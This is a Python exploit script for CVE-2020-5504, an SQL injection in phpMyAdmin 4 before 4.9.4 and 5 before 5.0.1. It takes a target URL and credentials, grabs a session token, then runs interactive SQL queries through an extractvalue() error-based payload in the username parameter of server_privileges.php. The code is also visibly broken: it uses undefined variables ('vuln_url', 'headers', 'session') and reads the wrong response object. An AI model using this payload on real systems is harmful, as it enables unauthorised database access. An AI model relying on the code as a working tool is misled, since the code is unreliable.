import requests
import re
import optparse
from requests.packages.urllib3.exceptions import InsecureRequestWarning

def title():
    print('+------------------------------------------')
    print('+  \033[34mPOC BY: http://github.com/xMohamed0  //Mohamed Alzhrani                \033[0m')
    print('+  \033[34mTARGET:  phpMyAdmin 4 before 4.9.4 and 5 before 5.0.1, SQL injection\033[0m')
    print('+  \033[36mUSAGE:  python3 CVE-2020-5504.py                                    \033[0m')
    print('+------------------------------------------')


def POC_1(Host,Ports,username,passwd):
    try:
        url = Host + ':' + Ports
        data = {
            'pma_username':username,
            'pma_password':passwd,
            'server':'1',
            'target':'index.php'
        }
        requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
        response = requests.post(url=vuln_url, headers=headers, verify=False, timeout=10)
        token_data = response.text
        Auth = str(re.search(r'(\w{32})',token_data).group())
    except Exception as e:
        print("\033[31m[x] OH NO! Target request failed  \033[0m")
    while True:
        commandLineInput = input("Type Command>")
        commandLine = url + "/server_privileges.php?ajax_request=true&validate_username=1&username=1'and extractvalue(1,concat(0x7e,(" + commandLineInput + "),0x7e))--+db=&token=" + Auth +"&viewing_mode=server"
        rresponse = session.get(commandLine)
        command = response.text
        if command == '{"redirect_flag":"1","success":false,"error":""}':
           print("\033[31m[x] OH NO! Target request failed  \033[0m")
        else:
           POC_2(command)

def POC_2(command):
   try:
      writeBack = str(re.search(r"(.+)",command).group())
      print(writeBack)
   except:
      print("\033[31m[x] OH NO! Failed to execute command \033[0m")

if __name__ == '__main__':
    title()
    Host = str(input("\033[35minput target  Url \nUrl    >>> \033[0m"))
    Ports = str(input("\033[35mTarget port >>>\033[0m"))
    username = str(input("\033[35minput username \n    >>> \033[0m"))
    passwd = str(input("\033[35minput password >>> \033[0m"))
    POC_1(Host,Ports,username,passwd)
